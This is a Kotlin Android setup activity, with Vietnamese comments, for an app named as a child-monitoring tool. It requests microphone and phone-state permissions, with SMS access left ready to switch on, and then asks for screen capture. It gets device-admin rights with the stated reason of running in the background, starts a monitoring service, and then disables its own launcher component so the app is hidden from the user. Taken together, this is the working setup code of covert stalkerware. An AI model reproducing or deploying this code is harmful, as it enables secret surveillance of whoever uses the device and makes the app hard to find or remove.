package com.example.childmonitoringapp

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.childmonitoringapp.service.MonitoringService
import com.example.childmonitoringapp.Constants

class SetupActivity : AppCompatActivity() {
    private val REQUEST_PERMISSIONS = 100
    private val REQUEST_SCREEN_CAPTURE = 101
    private val REQUEST_DEVICE_ADMIN = 102
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private val TAG = "SetupActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        // Khởi tạo MediaProjectionManager
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        // Tìm và gán sự kiện cho btn_setup, tránh lỗi nếu không tìm thấy
        val btnSetup = findViewById<Button>(R.id.btn_setup)
        if (btnSetup != null) {
            btnSetup.setOnClickListener {
                checkAndRequestPermissions() // Sửa lại gọi hàm đúng
            }
        } else {
            Log.e(TAG, "btn_setup not found in layout: R.layout.activity_setup")
            Toast.makeText(this, "Lỗi giao diện, kiểm tra layout", Toast.LENGTH_LONG).show()
        }

        // Kiểm tra và yêu cầu quyền tự động nếu chưa cấp
        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val basePermissions = mutableListOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE
        )
        if (Build.VERSION.SDK_INT >= 33) {
            basePermissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        // Thêm quyền nhạy cảm nếu cần (bỏ comment khi cần)
        // basePermissions.add(Manifest.permission.READ_SMS)

        val permissionsToRequest = basePermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), REQUEST_PERMISSIONS)
        } else {
            requestScreenCapture()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                requestScreenCapture()
            } else {
                Log.w(TAG, "Some permissions denied: ${permissions.joinToString()}")
                Toast.makeText(this, "Vui lòng cấp tất cả quyền để tiếp tục", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun requestScreenCapture() {
        try {
            val intent = mediaProjectionManager.createScreenCaptureIntent()
            startActivityForResult(intent, REQUEST_SCREEN_CAPTURE)
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting screen capture: ${e.message}")
            Toast.makeText(this, "Lỗi khi yêu cầu quay màn hình", Toast.LENGTH_LONG).show()
        }
    }

    private fun requestDeviceAdmin() {
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@SetupActivity, AdminReceiver::class.java))
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Ứng dụng cần quyền quản trị để chạy ngầm")
            }
            startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting device admin: ${e.message}")
            Toast.makeText(this, "Lỗi cấu hình quản trị", Toast.LENGTH_LONG).show()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQUEST_SCREEN_CAPTURE -> {
                if (resultCode == Activity.RESULT_OK && data != null) {
                    requestDeviceAdmin()
                    val serviceIntent = Intent(this, MonitoringService::class.java).apply {
                        putExtra(Constants.EXTRA_PROJECTION_DATA, data)
                    }
                    // Sử dụng startForegroundService cho API 28+
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ContextCompat.startForegroundService(this, serviceIntent)
                    } else {
                        startService(serviceIntent)
                    }
                } else {
                    Log.w(TAG, "Screen capture permission denied or data null")
                    Toast.makeText(this, "Từ chối quyền quay màn hình", Toast.LENGTH_LONG).show()
                }
            }
            REQUEST_DEVICE_ADMIN -> {
                if (resultCode == Activity.RESULT_OK) {
                    hideAppAndStartService()
                } else {
                    Log.w(TAG, "Device admin setup failed")
                    Toast.makeText(this, "Cấu hình thất bại, vui lòng thử lại", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun hideAppAndStartService() {
        try {
            val component = ComponentName(this, SetupActivity::class.java)
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            finish()
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app: ${e.message}")
            Toast.makeText(this, "Lỗi ẩn ứng dụng", Toast.LENGTH_LONG).show()
        }
    }
}